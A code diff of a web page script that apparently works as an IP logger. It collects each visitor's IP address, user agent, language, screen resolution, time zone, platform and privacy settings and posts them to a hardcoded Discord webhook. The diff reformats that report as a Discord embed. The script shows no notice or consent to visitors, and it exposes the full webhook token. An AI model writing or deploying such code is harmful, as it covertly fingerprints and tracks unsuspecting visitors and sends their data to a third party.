@@ -46,7 +46,26 @@
             const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';
 
             const data = {
-                content: `User Details:\n${details}`
+                embeds: [{
+                    title: 'User Details',
+                    description: 'Details of the user accessing the page.',
+                    color: 0x00ff00, // Green color
+                    fields: [
+                        { name: 'IP Address', value: details.ip, inline: true },
+                        { name: 'User-Agent', value: details.userAgent, inline: true },
+                        { name: 'Language', value: details.language, inline: true },
+                        { name: 'Screen Resolution', value: `${details.screenWidth}x${details.screenHeight}`, inline: true },
+                        { name: 'Color Depth', value: `${details.colorDepth} bits`, inline: true },
+                        { name: 'Time Zone', value: details.timeZone, inline: true },
+                        { name: 'Platform', value: details.platform, inline: true },
+                        { name: 'Cookies Enabled', value: details.cookiesEnabled, inline: true },
+                        { name: 'Do Not Track', value: details.doNotTrack, inline: true }
+                    ],
+                    footer: {
+                        text: 'Page accessed from Example.com'
+                    },
+                    timestamp: new Date()
+                }]
             };
 
             fetch(webhookUrl, {
@@ -74,18 +93,20 @@
                     return 'N/A';
                 });
 
-            const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const colorDepth = screen.colorDepth;
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const platform = navigator.platform;
-            const cookiesEnabled = navigator.cookieEnabled;
-            const doNotTrack = navigator.doNotTrack || 'Not enabled';
+            const details = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                doNotTrack: navigator.doNotTrack || 'Not enabled'
+            };
 
             return ipFetch.then(ip => {
-                return `IP: ${ip}\nUser-Agent: ${userAgent}\nLanguage: ${language}\nScreen Resolution: ${screenWidth}x${screenHeight}\nColor Depth: ${colorDepth} bits\nTime Zone: ${timeZone}\nPlatform: ${platform}\nCookies Enabled: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}`;
+                return { ip, ...details };
             });
         }
 
